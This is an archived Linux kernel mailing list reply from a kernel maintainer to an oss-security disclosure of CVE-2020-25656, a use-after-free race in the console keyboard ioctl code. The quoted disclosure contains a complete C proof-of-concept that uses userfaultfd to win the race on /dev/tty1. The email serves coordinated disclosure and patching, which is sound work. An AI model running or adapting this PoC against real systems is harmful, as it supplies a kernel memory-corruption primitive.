Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id A88CF28FEB4
	for <lists+linux-kernel@lfdr.de>; Fri, 16 Oct 2020 08:58:47 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S2404285AbgJPG6k (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Fri, 16 Oct 2020 02:58:40 -0400
Received: from mail-ej1-f65.google.com ([209.85.218.65]:39699 "EHLO
        mail-ej1-f65.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S2391432AbgJPG6j (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Fri, 16 Oct 2020 02:58:39 -0400
Received: by mail-ej1-f65.google.com with SMTP id lw21so1610524ejb.6
        for <linux-kernel@vger.kernel.org>; Thu, 15 Oct 2020 23:58:37 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:subject:to:references:from:message-id:date
         :user-agent:mime-version:in-reply-to:content-language
         :content-transfer-encoding;
        bh=+LlmKoINson/n29f4LgBdyByONTxSrfROU25ea+hdu0=;
        b=ZGjn4UQ9OLc+3QrzvWxaf58DcHXKW1ap2PEU1y8mK8kvoe4BqHeS7iEQdizbQEIzZo
         2nx/xYYFe0jblo9pWG+DYNjxToE5VOgqzRXkIVP40OQlaeCgkb9Vwl9DaN5Gb0ahSCdt
         RW84AvKZGSMXtTPWzaHY4UaYgdIowBhuyrn+nhyKJwTKELCptYFf5n6sxpXAn50qlfUD
         3nyxeXZu7n/6ZmfoVpqbmVbnGy/wH5Vdnz2T8H2HYVqoZwHzdVIH7dlA7SyRsWxOGYAe
         Q+qhMQSLsRd9m2IPZGbJ+B0Ufzf1KwDhaSSGdoHz4KWJPdrXADs0FEPymnb5NhFY419k
         FPng==
X-Gm-Message-State: AOAM531t+X5nItU0qHKewv6SrPGs3Zh+ksaBGdnFSwhNYVCkV3t3jGD4
        Q6Ref0NMPGv3s0sI5/XIWqaBp1kcPpo=
X-Google-Smtp-Source: ABdhPJzBXO2Q6xj6A53lssjuHwdvVgxNpvVeZ6bnEh8fg1VbMsBoUMpThgXgC7WGODimVF9NdOIX4A==
X-Received: by 2002:a17:906:4b18:: with SMTP id y24mr2371526eju.416.1602831516283;
        Thu, 15 Oct 2020 23:58:36 -0700 (PDT)
Received: from ?IPv6:2a0b:e7c0:0:107::49? ([2a0b:e7c0:0:107::49])
        by smtp.gmail.com with ESMTPSA id me12sm897053ejb.108.2020.10.15.23.58.35
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Thu, 15 Oct 2020 23:58:35 -0700 (PDT)
Subject: Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in
 vt_do_kdgkb_ioctl
To:     Minh Yuan <yuanmingbuaa@gmail.com>,
        oss-security@lists.openwall.com,
        Greg KH <gregkh@linuxfoundation.org>,
        Linux kernel mailing list <linux-kernel@vger.kernel.org>
References: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
 gmail ! com>
From:   Jiri Slaby <jirislaby@kernel.org>
Message-ID: <09826e03-525c-d307-5bfe-f51cb9298e1f@kernel.org>
Date:   Fri, 16 Oct 2020 08:58:34 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
 Thunderbird/78.3.1
MIME-Version: 1.0
In-Reply-To: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
 gmail ! com>
Content-Type: text/plain; charset=iso-8859-2; format=flowed
Content-Language: en-US
Content-Transfer-Encoding: 7bit
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Cc Greg.

On 16. 10. 20, 5:39, Minh Yuan wrote:
> Hi,
> 
> We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
> version 3.4 to the latest version (v5.9 for now).
> 
> The root cause of this vulnerability is that there exits a race in
> KDGKBSENT and KDSKBSENT.
> 
> Here are details:
> 1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
> 2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
> func_table, at the same time, due to KDGKBSENT has no lock, we can use
> KDSKBSENT again to allocate a larger buffer than step1, and the old
> funcbufptr will be freed. However, we've obtained the heap pointer in
> KDGKBSENT, so a uaf read will happen while executing put_user.

Hi,

this is likely the issue I am fixing at:
https://git.kernel.org/pub/scm/linux/kernel/git/jirislaby/linux.git/commit/?h=devel&id=57c85191e788e172a446e34ef77d34473cfb1e8d

I think, it won't apply cleanly as it's a part of a larger set. I will 
reorder the patch and send something during the day.

Thanks.

> I've successfully reproduced this bug in a special way.
> However, to write a universal PoC for anyone else to reproduce it,  I use
> userfaultfd to handle the order of "free" and "use" in multithreading
> environment. This is my PoC:
> 
> // author by ziiiro@thu
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
> #include <sys/ioctl.h>
> #include <string.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <sys/mman.h>
> #include <poll.h>
> #include <pthread.h>
> #include <errno.h>
> #include <stdlib.h>
> #include <signal.h>
> #include <string.h>
> #include <sys/syscall.h>
> #include <linux/userfaultfd.h>
> #include <pthread.h>
> #include <poll.h>
> #include <linux/prctl.h>
> #include <stdint.h>
> 
> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
>                         } while (0)
> 
> #define KDGKBSENT 0x4B48 /* gets one function key string entry */
> #define KDSKBSENT 0x4B49 /* sets one function key string entry */
> 
> struct kbsentry {
> unsigned char kb_func;
> unsigned char kb_string[512];
> };
> int fd;
> static int page_size;
> static void *fault_handler_thread(void *arg) {
>    unsigned long value;
>    static struct uffd_msg msg;
>    static int fault_cnt = 0;
>    long uffd;
>    static char *page = NULL;
>    struct uffdio_copy uffdio_copy;
>    int len, i;
>    if (page == NULL) {
>      page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
>                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
>      if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
>    }
>    uffd = (long)arg;
> 
>    for(;;) {
>      struct pollfd pollfd;
>      pollfd.fd = uffd;
>      pollfd.events = POLLIN;
>      len = poll(&pollfd, 1, -1);
> 
> 
>      read(uffd, &msg, sizeof(msg));
>      printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
>      printf("    address = 0x%lx\n", msg.arg.pagefault.address);
>      switch(fault_cnt) {
>          case 0:
>              puts("triggered in the first page!");
>              break;
>          case 1:
>              puts("triggered in the seccond page!");
>              munmap((void*)0x233000,page_size);
>              void *addr = (void*)mmap((void*)0x233000,
>                          page_size,
>                          PROT_READ | PROT_WRITE,
>                          MAP_FIXED | MAP_PRIVATE | MAP_ANON,
>                          -1, 0);
>              if ((unsigned long)addr != 0x233000)
>                  errExit("mmap (0x233000)");
>              // register 0x233000 again to trigger put_user
>              struct uffdio_register uffdio_register;
>              uffdio_register.range.start = (unsigned long)addr;
>              uffdio_register.range.len   = page_size;
>              uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
>              if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
>                  errExit("ioctl: UFFDIO_REGITER");
>              break;
>          case 2:
>              puts("triggered in put_user!");
>              struct kbsentry *kbs;
>              kbs = malloc(sizeof(struct kbsentry));
>              kbs->kb_func = 0;
> 
> strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
> bbbbbbbbb");
>              // free old funcbufptr
>              ioctl(fd,KDSKBSENT,kbs);
>              break;
> 
>      }
>      // return to kernel-land
>      uffdio_copy.src = (unsigned long)page;
>      uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
> ~(page_size - 1);
>      uffdio_copy.len = page_size;
>      uffdio_copy.mode = 0;
>      uffdio_copy.copy = 0;
>      if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
>          errExit("ioctl: UFFDIO_COPY");
> 
>      fault_cnt++;
> 
>    }
> }
> // use userfaultfd to handle free->use
> void setup_pagefault(void *addr, unsigned size) {
>    long uffd;
>    pthread_t th;
>    struct uffdio_api uffdio_api;
>    struct uffdio_register uffdio_register;
>    int s;
>    // new userfaulfd
> 
>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
>    if (uffd == -1) errExit("userfaultfd");
>    // enabled uffd object
>    uffdio_api.api = UFFD_API;
>    uffdio_api.features = 0;
>    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
> UFFDIO_API");
>    // register memory address
>    uffdio_register.range.start = (unsigned long)addr;
>    uffdio_register.range.len   = size;
>    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
> //UFFDIO_REGISTER_MODE_WP;//
>    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("io=
> ctl:
> UFFDIO_REGITER");
>    // monitor page fault
>    s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
>    if (s != 0) errExit("pthread_create");
> }
> 
> 
> int main(int argc, char** argv)
> {
>          struct kbsentry *kbs;
>          pthread_t th;
>          page_size = sysconf(_SC_PAGE_SIZE);
>          void *addr = (void*)mmap((void*)0x233000,
>                              page_size * 2,
>                              PROT_READ | PROT_WRITE,
>                              MAP_FIXED | MAP_PRIVATE | MAP_ANON,
>                              -1, 0);
>          if ((unsigned long)addr != 0x233000)
>              errExit("mmap (0x233000)");
>          setup_pagefault(addr, page_size * 2);
>          kbs = malloc(sizeof(struct kbsentry));
>          kbs->kb_func = 0;
>          fd = open("/dev/tty1", O_RDONLY, 0);
> 
> strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
> a");
>          // allocate a lager funcbufptr
>          ioctl(fd,KDSKBSENT,kbs);
>          // use KDGKBSENT to access the new funcbufptr
>          ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
>          return 1;
> 
> }
> 
> Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
> is also needed. Besides, it needs the privilege to access tty to trigger
> this bug.
> 
> We've noticed that this bug was also discovered by Syzbot 8 months ago, but
> no one has successfully reproduced it (
> https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
> leaving this issue ignored and upatched yet. Hope this PoC can help
> someone.
> 
> Timeline:
> * 10.15.20 - Vulnerability reported to security@kernel.org and
> linux-distros@vs.openwall.org.
> * 10.15.20 - CVE-2020-25656 assigned.
> * 10.16.20 - Vulnerability opened.
> 
> Thanks,
> Yuan Ming and Bodong Zhao, Tsinghua University
> 


-- 
js
suse labs
